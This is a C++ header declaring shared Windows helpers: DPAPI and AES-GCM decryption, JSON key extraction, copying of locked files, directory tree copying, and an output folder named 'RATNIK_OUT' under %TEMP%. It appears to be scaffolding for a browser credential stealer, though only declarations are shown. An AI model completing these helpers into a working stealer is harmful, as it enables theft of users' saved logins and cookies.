// common.h — helpers shared by all modules
#pragma once
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <winhttp.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <map>
#include <fstream>
#include <filesystem>
#include <cstdio>
#include <cstdint>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")

namespace fs = std::filesystem;
using Bytes = std::vector<unsigned char>;

void Log(const char* fmt, ...);
void LogClose();
fs::path LogPath();

std::wstring Env(const wchar_t* name);
fs::path ExeDir();
fs::path TempDir();
fs::path OutDir();   // RATNIK_OUT override, else %TEMP%
std::string ToUtf8(const std::wstring& w);
std::wstring ToWide(const std::string& s);
std::string NowStamp();

Bytes ReadAll(const fs::path& p);
bool WriteAll(const fs::path& p, const Bytes& b);
Bytes Base64Decode(const std::string& in);
std::string Base64Encode(const Bytes& in);

Bytes DpapiDecrypt(const Bytes& in);
Bytes AesGcmDecrypt(const Bytes& key, const Bytes& nonce, const Bytes& ct, const Bytes& tag);

std::string JsonString(const std::string& json, const std::string& key);

bool CopyFileShared(const fs::path& src, const fs::path& dst);
void CopyTree(const fs::path& src, const fs::path& dst, uint64_t maxBytes);
